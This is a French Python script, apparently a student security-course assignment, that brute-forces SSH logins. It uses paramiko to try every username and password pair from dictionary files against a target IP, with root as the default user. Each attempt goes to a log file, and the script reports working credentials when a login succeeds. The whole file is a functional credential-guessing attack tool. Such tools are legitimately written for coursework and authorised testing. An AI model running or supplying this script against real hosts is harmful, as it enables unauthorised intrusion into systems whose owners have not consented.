#C:/ProgramData/Anaconda3/python.exe
# A envoyer a melvin.bissor@andn-services.fr
# object : [BSSR3][Nom Prenom] Python BrutForce
# Avant Lundi 4 Juillet
#Mettre dans un ZIP avec tous les scripts demandé

#------------------------------------------------------------------------------------------
#Pb que j'ai:  
# J'en ai pas :) enfin plus
#Sinon le butfroce fonction
#------------------------------------------------------------------------------------------


import readline
import sys
import paramiko
import argparse
import time

ssh_client = paramiko.SSHClient()
count_ligne_pass= 0
count_ligne_login= 0

parser = argparse.ArgumentParser()
parser.add_argument("-ssh", help="Definit que le service a attaquer est le ssh",action="store_true")
parser.add_argument("-http", help="Definit que le service a attaquer est le http",action="store_true")
parser.add_argument("-ip", help="Defini l'IP ou l'URL a attaquer")
parser.add_argument("-pwd", help="Definit le dictionnaire de mots de passe qui va etre utilise")
parser.add_argument("-log", help="Definit le dictionnaire de login qui va etre utilise")
args = parser.parse_args()


def requet_ssh(password, login, url,heure):        
        # A voir ce que fait la ligne avant
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try: # Ligne de tentative de connection
            ssh_client.connect(hostname=url, username=login, password=password, auth_timeout=0.5)

        except:
            print("Test de connection qui a echoue avec",login,":", password)
            fichier = open("brutforce.log", "a") # j'ai pas reussi a tous mettre dans 1 fichier.write donc j'ai découtper, la ligne en dessous ne marche pas
            # fichier.write(heure,"  tentative de connection ssh echouer sur la cible ",url," avec le login : ",login," et le mots de passe ",password, "\n")
            fichier.write(heure)
            fichier.write(" tentative de connection ssh echouer sur la cible ")
            fichier.write(url)
            fichier.write(" avec le login : ")
            fichier.write(login)
            fichier.write(" et le mot de passe : ")
            fichier.write(password)
            fichier.write("\n")
            fichier.close()

        else:
            print ("Connection reussi sur la machine", url, "avec les credentials", login, ":", password)
            fichier = open("brutforce.log", "a") # j'ai pas reussi a tous mettre dans 1 fichier.write donc j'ai découtper, la ligne en dessous ne marche pas
            # fichier.write(heure,"  tentative de connection ssh reussi sur la cible ",url," avec le login : ",login," et le mots de passe ",password, "\n")
            fichier.write(heure)
            fichier.write(" tentative de connection ssh reussi sur la cible ")
            fichier.write(url)
            fichier.write(" avec le login : ")
            fichier.write(login)
            fichier.write(" et le mot de passe : ")
            fichier.write(password)
            fichier.write("\n")
            fichier.close()
            quit()


if args.http:
    print("Le http n'est pas encore disponible")
    sys.exit()

if args.pwd: # On découpe le dictionnaire de mdp ligne par ligne
    try :
        passdico = open(args.pwd).read().splitlines()
    except : 
        print ("le dictionnaire non lisible ou n'existe pas")
        quit()

if args.log: #On découpe le dictionnaire de login en ligne par ligne
    try :
        logdico = open(args.log).read().splitlines()
    except :
        print("le dictionnaire n'existe pas ou n'est pas lisible")
        quit()

if args.ssh and args.ip and args.pwd and args.log: # Si il y a un dictionnaire de login et de pwd
    print ("Attaque en cours sur ",args.ip," avec le dictionnaire login ",args.log," et le dictionnaire de mots de passe ",args.pwd)
    for login in logdico :
        for password in passdico :
            temps=time.strftime('%Y-%m-%d %H:%M:%S') # Pour avoir le date et l'heure
            requet_ssh(password,login,args.ip,temps) # appel de fonction request ssh

elif args.ssh and args.ip and args.pwd : # Si il n'y a qu'un dictionnaire de pwd, on mets root par defaut
    print ("Attaque en cours sur ",args.ip," avec le dictionnaire de mots de passe ",args.pwd)
    for password in passdico :
        temps=time.strftime('%Y-%m-%d %H:%M:%S') # Pour avoir le date et l'heure 
        requet_ssh(password,"root",args.ip,temps) # appel de fonction request ssh

else :
    print("Il manque des argument, il faut au mois les argument -ssh -ip -pwd")



sys.exit()